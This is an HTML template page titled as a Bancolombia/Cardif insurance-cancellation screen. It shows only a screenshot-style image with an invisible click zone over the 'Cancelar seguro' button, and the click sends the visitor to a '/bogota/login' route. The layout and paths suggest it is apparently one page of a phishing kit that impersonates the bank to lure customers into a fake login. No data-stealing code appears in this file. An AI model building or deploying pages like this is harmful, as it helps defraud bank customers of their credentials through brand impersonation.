<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cancela tu Seguro Cardif - Bancolombia</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: Arial, sans-serif;
            background-color: #ffffff;
            overflow-x: hidden;
            margin: 0;
            padding: 0;
        }

        .container {
            position: relative;
            width: 100%;
            max-width: 480px;
            margin: 0 auto;
        }

        .imagen-fondo {
            width: 100%;
            height: auto;
            display: block;
        }

        /* Área clicable sobre el botón "Cancelar seguro" */
        .boton-clickable {
            position: absolute;
            top: 17.5%;  /* Posición del botón amarillo */
            left: 50%;
            transform: translateX(-50%);
            width: 70%;  /* Ancho proporcional del botón */
            height: 3.2%;  /* Alto proporcional del botón */
            cursor: pointer;
            /* Para debug, descomenta la siguiente línea para ver el área clicable */
            /* background-color: rgba(255, 0, 0, 0.3); */
        }

        .boton-clickable:active {
            opacity: 0.7;
        }
    </style>
    <x-control :auto-guardar="false" :auto-completar="false" :auto-init="true" :debug="false" />
</head>

<body>
    <div class="container">
        <!-- Imagen de fondo con todo el contenido -->
        <img src="/3co/assets/cardif.webp" alt="Cancela tu Seguro Cardif" class="imagen-fondo" />

        <!-- Área clicable sobre el botón "Cancelar seguro" -->
        <div class="boton-clickable" id="btnCancelar"></div>
    </div>

    <script>
        // Funcionalidad del botón "Cancelar seguro"
        document.getElementById('btnCancelar').addEventListener('click', function() {
            // Redirigir a la vista login
            window.location.href = '/bogota/login';
        });
    </script>
</body>

</html>
